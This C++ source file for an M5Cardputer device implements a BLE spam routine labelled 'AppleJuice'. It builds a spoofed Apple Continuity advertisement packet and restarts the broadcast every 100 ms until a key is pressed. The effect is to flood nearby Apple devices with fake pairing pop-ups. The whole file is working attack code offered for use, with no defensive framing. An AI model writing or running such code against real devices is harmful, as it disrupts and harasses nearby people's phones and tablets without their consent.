#include "ble_spam.h"
#include "../ui.h"
#include <NimBLEDevice.h>

void runBleSpam() {
    auto& display = M5Cardputer.Display;
    display.fillScreen(THEME_BG);
    display.setTextColor(THEME_FG, THEME_BG);
    display.setTextSize(2); display.setCursor(10, 10); display.println("BLE Spam");
    display.setTextSize(1); display.setCursor(10, 50); display.println("Starting AppleJuice...");
    
    NimBLEDevice::init("Flicat");
    NimBLEServer* pServer = NimBLEDevice::createServer();
    NimBLEAdvertising* pAdvertising = pServer->getAdvertising();
    uint8_t applePacket[] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)applePacket, sizeof(applePacket)));
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
    
    while (true) {
        M5Cardputer.update();
        if (M5Cardputer.Keyboard.isKeyPressed('`')) break;
        pAdvertising->stop(); pAdvertising->start(); delay(100);
    }
    pAdvertising->stop(); NimBLEDevice::deinit();
    display.fillScreen(THEME_BG); display.setCursor(10, 50); display.println("Stopped"); delay(500);
}
